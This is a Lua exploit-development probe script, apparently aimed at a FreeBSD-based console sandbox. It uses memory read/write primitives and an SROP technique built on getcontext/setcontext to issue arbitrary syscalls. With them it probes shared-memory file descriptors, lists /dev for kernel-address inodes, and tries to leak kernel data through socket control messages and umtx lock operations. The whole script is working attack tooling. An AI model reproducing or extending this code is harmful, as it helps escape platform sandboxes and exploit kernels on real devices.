-- CRASH_CLASS: LOW
-- PROBE 142s: Lean SHM fd check + open /dev + plain sendmsg + RW lock
-- Slimmed from 142r which timed out from too many SROP calls.

print("=== PROBE 142s: LEAN TESTS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

--------------------------------------------------------------------
-- [A] SHM fd: check fds 20-30 before/after
--------------------------------------------------------------------
print("")
print("--- [A] SHM fd discovery ---")

-- Quick fd check: just try fstat on 20-30
local stat_buf = gpu + 0x1000
local before = ""
for fd = 20, 30 do
    local rv = srop(189, uint64(fd), ua(stat_buf))
    local h, l = get_hi_lo(rv)
    if l == 0 and h == 0 then before = before .. fd .. " " end
end
print("[A] fds before: " .. before)

-- SHM create
local shm_key = gpu + 0x2000
wq(shm_key, uint64(0x1234))
local rv_shm = srop(454, ua(shm_key), uint64(25), uint64(1))
print("[A] SHM_CREAT ret=" .. hex(rv_shm))

local after = ""
for fd = 20, 30 do
    local rv = srop(189, uint64(fd), ua(stat_buf))
    local h, l = get_hi_lo(rv)
    if l == 0 and h == 0 then after = after .. fd .. " " end
end
print("[A] fds after: " .. after)

-- Second SHM
wq(shm_key, uint64(0x5678))
srop(454, ua(shm_key), uint64(25), uint64(1))
local after2 = ""
for fd = 20, 30 do
    local rv = srop(189, uint64(fd), ua(stat_buf))
    local h, l = get_hi_lo(rv)
    if l == 0 and h == 0 then after2 = after2 .. fd .. " " end
end
print("[A] fds after shm2: " .. after2)

--------------------------------------------------------------------
-- [B] open /dev + getdirentries
--------------------------------------------------------------------
print("")
print("--- [B] Open /dev ---")

local devpath = gpu + 0x3000
wd(devpath, 0x7665642F)  -- "/dev"
wd(devpath + 4, 0)

local rv_open = srop(5, ua(devpath), uint64(0))
local oh, ol = get_hi_lo(rv_open)
print("[B] open(/dev) ret=" .. hex(rv_open))

if ol < 256 and oh == 0 then
    local dev_fd = ol
    print("[B] /dev fd=" .. dev_fd)

    local dent_buf = gpu + 0x4000
    for off = 0, 0x3FF, 4 do wd(dent_buf + off, 0) end
    local basep = gpu + 0x4400
    wq(basep, uint64(0))

    local rv_gd = srop(196, uint64(dev_fd), ua(dent_buf), uint64(0x400), ua(basep))
    local gdh, gdl = get_hi_lo(rv_gd)
    print("[B] getdirentries ret=" .. hex(rv_gd))

    if gdl > 0 and gdl < 0x400 then
        local pos = 0
        local count = 0
        while pos < gdl and count < 15 do
            local ino_lo = safe_rd(dent_buf + pos)
            local ino_hi = safe_rd(dent_buf + pos + 4)
            local r8 = safe_rd(dent_buf + pos + 8)
            if not r8 then break end
            local reclen = r8 % 65536
            local d_type = math.floor(r8 / 65536) % 256
            local d_namlen = math.floor(r8 / 16777216) % 256

            if reclen == 0 or reclen > 512 then break end

            local name = ""
            for ci = 0, math.min(d_namlen - 1, 23) do
                local aligned_off = pos + 12 + ci - (ci % 4)
                local cb = safe_rd(dent_buf + aligned_off)
                if cb then
                    local shift = (ci % 4) * 8
                    local ch = math.floor(cb / (2^shift)) % 256
                    if ch >= 32 and ch < 127 then
                        name = name .. string.char(ch)
                    end
                end
            end

            if ino_hi and ino_hi >= 0xFFFF8000 then
                print("[B] *** KERNEL INODE: " .. name .. " ***")
            else
                print("[B]  " .. name .. " ino=" .. (ino_lo or 0) .. " type=" .. d_type)
            end

            pos = pos + reclen
            count = count + 1
        end
    end
    srop(6, uint64(dev_fd))
end

--------------------------------------------------------------------
-- [C] Plain sendmsg on socketpair
--------------------------------------------------------------------
print("")
print("--- [C] Sendmsg ---")

local sp_fds = gpu + 0x5000
wd(sp_fds, 0xDEAD); wd(sp_fds + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp_fds))
local fd_a = safe_rd(sp_fds)
local fd_b = safe_rd(sp_fds + 4)
print("[C] socketpair: " .. (fd_a or "nil") .. ", " .. (fd_b or "nil"))

if fd_a and fd_a ~= 0xDEAD then
    -- Build minimal sendmsg struct
    local sdata = gpu + 0x6000
    wd(sdata, 0x54534554)  -- "TEST"

    local siov = gpu + 0x6100
    wq(siov, ua(sdata))           -- iov_base
    wq(siov + 8, uint64(4))       -- iov_len

    local smsg = gpu + 0x6200
    for off = 0, 0x2F, 4 do wd(smsg + off, 0) end  -- zero entire msghdr
    wq(smsg + 0x10, ua(siov))     -- msg_iov
    wd(smsg + 0x18, 1)            -- msg_iovlen

    local rv_send = srop(28, uint64(fd_a), ua(smsg), uint64(0))
    print("[C] sendmsg ret=" .. hex(rv_send))

    -- Simple recv with write(4)/read(3) since it worked in 142o
    local rbuf = gpu + 0x7000
    wd(rbuf, 0)
    local rv_r = srop(3, uint64(fd_b), ua(rbuf), uint64(4))
    print("[C] read ret=" .. hex(rv_r))
    local rd = safe_rd(rbuf)
    print("[C] data=0x" .. string.format("%08X", rd or 0))

    -- Now try recvmsg with cmsg buffer to catch kernel auto-fill
    -- First set LOCAL_CREDS on receiver
    local optval = gpu + 0x7100
    wd(optval, 1)
    srop(105, uint64(fd_b), uint64(0), uint64(2), ua(optval), uint64(4))

    -- Send again
    wd(sdata, 0x41424344)
    rv_send = srop(28, uint64(fd_a), ua(smsg), uint64(0))
    print("[C] sendmsg2 ret=" .. hex(rv_send))

    if rv_send then
        local rsh, rsl = get_hi_lo(rv_send)
        if rsl == 4 then
            -- recvmsg with cmsg buffer
            local rcmsg = gpu + 0x8000
            for off = 0, 0xFF, 4 do wd(rcmsg + off, 0xDD) end

            local riov = gpu + 0x8100
            wq(riov, ua(rbuf))
            wq(riov + 8, uint64(128))

            local rmsg = gpu + 0x8200
            for off = 0, 0x2F, 4 do wd(rmsg + off, 0) end
            wq(rmsg + 0x10, ua(riov))
            wd(rmsg + 0x18, 1)
            wq(rmsg + 0x20, ua(rcmsg))
            wd(rmsg + 0x28, 256)

            local rv_recv = srop(27, uint64(fd_b), ua(rmsg), uint64(0))
            print("[C] recvmsg ret=" .. hex(rv_recv))
            local clen = safe_rd(rmsg + 0x28)
            print("[C] controllen=" .. (clen or "nil"))

            if clen and clen > 0 then
                print("[C] *** KERNEL CMSG DATA! ***")
                for off = 0, math.min(clen, 128), 4 do
                    local v = safe_rd(rcmsg + off)
                    if v then
                        print("[C]  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- [D] RW lock + CV quick test
--------------------------------------------------------------------
print("")
print("--- [D] RW/CV ops ---")

local rwl = gpu + 0x9000
for off = 0, 0x1F, 4 do wd(rwl + off, 0) end

local rv1 = srop(454, ua(rwl), uint64(19))  -- RDLOCK
print("[D] RDLOCK ret=" .. hex(rv1) .. " state=" .. (safe_rd(rwl) or "?"))

local rv2 = srop(454, ua(rwl), uint64(21))  -- UNLOCK
print("[D] UNLOCK ret=" .. hex(rv2) .. " state=" .. (safe_rd(rwl) or "?"))

local rv3 = srop(454, ua(rwl), uint64(20))  -- WRLOCK
print("[D] WRLOCK ret=" .. hex(rv3) .. " state=" .. (safe_rd(rwl) or "?"))

local rv4 = srop(454, ua(rwl), uint64(21))  -- UNLOCK
print("[D] UNLOCK2 ret=" .. hex(rv4) .. " state=" .. (safe_rd(rwl) or "?"))

-- CV signal/broadcast (should be no-ops with no waiters)
local cv = gpu + 0x9100
for off = 0, 0xF, 4 do wd(cv + off, 0) end
local rv5 = srop(454, ua(cv), uint64(16))  -- CV_SIGNAL
print("[D] CV_SIGNAL ret=" .. hex(rv5))
local rv6 = srop(454, ua(cv), uint64(17))  -- CV_BROADCAST
print("[D] CV_BROADCAST ret=" .. hex(rv6))

print("")
print("=== DONE ===")
